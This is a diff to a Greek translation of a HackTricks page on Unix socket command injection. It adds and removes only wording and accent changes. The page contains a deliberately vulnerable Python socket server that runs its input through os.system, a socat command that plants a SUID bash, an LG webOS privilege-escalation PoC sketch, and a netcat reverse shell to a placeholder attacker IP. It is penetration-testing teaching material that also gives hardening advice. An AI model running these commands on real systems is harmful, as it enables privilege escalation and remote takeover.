@@ -1,10 +1,10 @@
-# Socket Command Injection
+# Εγχυση Εντολων Socket
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Παράδειγμα binding ενός socket με Python
+## Παραδειγμα δεσμευσης Socket με Python
 
-Στο ακόλουθο παράδειγμα δημιουργείται ένα **unix socket** (`/tmp/socket_test.s`) και οτιδήποτε **λαμβάνεται** πρόκειται να **εκτελεστεί** από το `os.system`. Γνωρίζω ότι δεν πρόκειται να βρείτε κάτι τέτοιο στην πράξη, αλλά ο στόχος αυτού του παραδείγματος είναι να δείξει πώς μοιάζει ο κώδικας που χρησιμοποιεί unix sockets και πώς γίνεται η διαχείριση της εισόδου στη χειρότερη δυνατή περίπτωση.
+Στο παρακατω παραδειγμα δημιουργειται ενα **unix socket** (`/tmp/socket_test.s`) και οτιδηποτε **λαμβανεται** προκειται να **εκτελεστει** απο το `os.system`.Γνωριζω οτι δεν προκειται να βρειτε κατι τετοιο στην πραξη, αλλα ο στοχος αυτου του παραδειγματος ειναι να δειτε πως μοιαζει ο κωδικας που χρησιμοποιει unix sockets και πως να διαχειριζεστε την εισοδο στη χειροτερη δυνατη περιπτωση.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Εκτελέστε** τον κώδικα χρησιμοποιώντας `python`: `python s.py` και **ελέγξτε πώς ακούει το socket**:
+**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,17 +37,17 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Μελέτη περίπτωσης: Κλιμάκωση μέσω UNIX socket ιδιοκτησίας root, που ενεργοποιείται από signal (LG webOS)
+## Μελέτη περίπτωσης: κλιμάκωση μέσω Root-owned UNIX socket με ενεργοποίηση από signal (LG webOS)
 
-Ορισμένοι προνομιούχοι daemons εκθέτουν ένα UNIX socket ιδιοκτησίας root, το οποίο δέχεται μη αξιόπιστα δεδομένα και συνδέει προνομιούχες ενέργειες με thread IDs και signals. Αν το πρωτόκολλο επιτρέπει σε έναν μη προνομιούχο client να επηρεάσει ποιο native thread θα στοχευτεί, ενδέχεται να μπορείτε να ενεργοποιήσετε ένα προνομιούχο code path και να κάνετε escalation.
+Ορισμένοι privileged daemons εκθέτουν ένα root-owned UNIX socket που δέχεται untrusted input και συνδέει privileged actions με thread-IDs και signals. Αν το protocol επιτρέπει σε έναν unprivileged client να επηρεάσει ποιο native thread θα στοχευτεί, ενδέχεται να μπορείτε να ενεργοποιήσετε ένα privileged code path και να κάνετε escalate.<sup>[[1]](#references)</sup>
 
 Παρατηρούμενο μοτίβο:
-- Συνδεθείτε σε ένα socket ιδιοκτησίας root (π.χ. /tmp/remotelogger).
-- Δημιουργήστε ένα thread και λάβετε το native thread id (TID).
+- Συνδεθείτε σε ένα root-owned socket (π.χ. /tmp/remotelogger).
+- Δημιουργήστε ένα thread και λάβετε το native thread id (TID) του.
 - Στείλτε το TID (packed) μαζί με padding ως request· λάβετε ένα acknowledgement.
-- Παραδώστε ένα συγκεκριμένο signal σε αυτό το TID για να ενεργοποιήσετε την προνομιούχα συμπεριφορά.
+- Στείλτε ένα συγκεκριμένο signal σε αυτό το TID για να ενεργοποιήσετε την privileged συμπεριφορά.
 
-Minimal PoC sketch:
+Ελάχιστο PoC sketch:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -64,11 +64,12 @@ os.kill(tid, 4)  # deliver SIGILL (example from the case)
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιούχα κατάσταση client (TIDs) και τη σύνδεσή τους με προνομιούχους signal handlers ή logic.
-- Ενισχύστε την ασφάλεια επιβάλλοντας credentials στο socket, επικυρώνοντας τις μορφές των μηνυμάτων και αποσυνδέοντας τις προνομιούχες λειτουργίες από thread identifiers που παρέχονται εξωτερικά.
+Σημειώσεις:
+- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από την κατάσταση client χωρίς προνόμια (TIDs) και τη σύνδεσή τους με privileged signal handlers ή λογική.
+- Ενισχύστε την ασφάλεια επιβάλλοντας credentials στο socket, επικυρώνοντας τις μορφές των μηνυμάτων και αποσυνδέοντας τις privileged λειτουργίες από αναγνωριστικά threads που παρέχονται εξωτερικά.
 
 ## Αναφορές
 
-- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [LG WebOS TV Path Traversal, Authentication Bypass και πλήρης κατάληψη συσκευής (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
